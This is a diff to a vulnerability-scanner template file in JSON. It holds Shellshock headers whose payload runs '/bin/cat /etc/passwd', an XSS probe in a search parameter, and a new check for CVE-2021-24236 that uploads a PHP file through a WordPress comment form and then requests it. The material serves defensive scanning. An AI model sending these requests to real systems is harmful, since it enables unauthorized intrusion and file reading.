@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -13948,6 +13948,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/tour-list/?keywords=%3Cinput%2FAutofocus%2F%250D*%2FOnfocus%3Dalert%28123%29%3B%3E&start_date=xxxxxxxxxxxx&avaibility=13"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24236",
+      "info": {
+        "name": "WordPress Plugin Imagements 1.2.5 - Unauthenticated Arbitrary File Upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-comments-post.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYl2Oz8ptq5OMtbU\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"author\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"email\"\n\n{{randstr}}@email.com\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"url\"\n\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"checkbox\"\n\nyes\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"naam\"\n\n{{randstr}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"image\"; filename=\"{{php}}\"\nContent-Type: image/jpeg\n\n<?php echo 'CVE-2021-24236'; ?>\n\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"submit\"\n\nPost Comment\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment_post_ID\"\n\n{{post}}\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU\nContent-Disposition: form-data; name=\"comment_parent\"\n\n0\n------WebKitFormBoundaryIYl2Oz8ptq5OMtbU--\n",
+            "GET /wp-content/plugins/imagements/images/{{php}} HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
